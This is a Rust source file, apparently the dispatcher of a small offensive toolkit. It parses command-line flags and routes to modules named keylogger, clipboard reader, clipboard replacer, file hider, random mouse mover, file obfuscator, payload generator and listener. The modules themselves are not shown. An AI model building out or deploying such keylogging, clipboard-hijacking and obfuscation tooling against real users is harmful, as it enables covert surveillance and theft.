mod generator;
mod listener;
mod tools;
use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, obfuscate, Tool};
use std::{
    io::{self, Write},
    error::Error,
};

fn check_tool(input: &str) -> Tool {
    match input {
        "keylogger" => return Tool::Keylogger,
        "clipboard" => return Tool::Clipboard,
        "replaceboard" => return Tool::ReplaceBoard,
        "ghost" => return Tool::Ghost,
        "mouseketool" => return Tool::Mouseketool,
        "obfuscate" => return Tool::Obfuscate,
        _ => return Tool::Invalid, 
    }
}

pub fn trim_trailing_newline(input: &mut String) {
    if let Some('\n')=input.chars().next_back() {
        input.pop();
    }
    if let Some('\r')=input.chars().next_back() {
        input.pop();
    }
}

pub fn get_filename() -> io::Result<String> {
    let mut input = String::new();
    let mut confirmation = String::new();
    while confirmation.to_uppercase() != "Y" {
        input.clear();
        confirmation.clear();

        print!("Enter the file you would like to obfuscate: ");
        io::stdout().flush()?;
        io::stdin().read_line(&mut input)?;
        trim_trailing_newline(&mut input);

        print!("You entered {input}, is this correct? (Y/N): ");
        io::stdout().flush()?;
        io::stdin().read_line(&mut confirmation)?;
        trim_trailing_newline(&mut confirmation);

        while confirmation.to_uppercase() != "Y" && confirmation.to_uppercase() != "N" {
            confirmation.clear();
            print!("Incorrect input, try again (Y/N): "); 
            io::stdout().flush()?;
            io::stdin().read_line(&mut confirmation)?;
            trim_trailing_newline(&mut confirmation);
        }
    }

    Ok(input)
}

pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static str> {
    args.next(); // Skip the first argument (usually the program name)
    
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "generate" => {
                generator::generate();
            }
            "listen" => {
                listener::start();
            }
            "-t" | "--tool" => {
                if let Some(value) = args.next() {
                    return Ok(check_tool(&value));
                } else {
                    return Err("Did not supply a tool name");
                }
            }
            "--list" => {
                return Err("\n
Available tools:
- clipboard         Outputs the current clipboard
- ghost             Changes files in the current directory to hidden
- keylogger         Listens for keypresses and outputs them to a log file
- mouseketool       Moves mouse to a random position every so often
- replaceboard      Replaces the clipboard text
");

            }
            _ => return Err("Invalid flag"),
        }
    }
    
    Err("
No tool specified. Use -t or --tool to specify a tool
Use --list to see a list of available tools")
}

pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
    match tool {
        Tool::Keylogger => {
            let _ = keylogger::run();
        }
        Tool::Clipboard => {
            let _ = clipboard::run()?;
        }
        Tool::ReplaceBoard => {
            let _ = replaceboard::run()?;
        }
        Tool::Ghost => {
            let _ = ghost::run()?;
        }
        Tool::Mouseketool => {
            let _ = mouseketool::run()?;
        } 
        Tool::Obfuscate => {
            let filename = get_filename()?;
            let _ = obfuscate::run(filename)?;
            return Ok(())
        }
        Tool::Invalid => {
            // Return an error if the tool is invalid
            return Err("Invalid tool".into());
        }
    }
    Ok(())
}
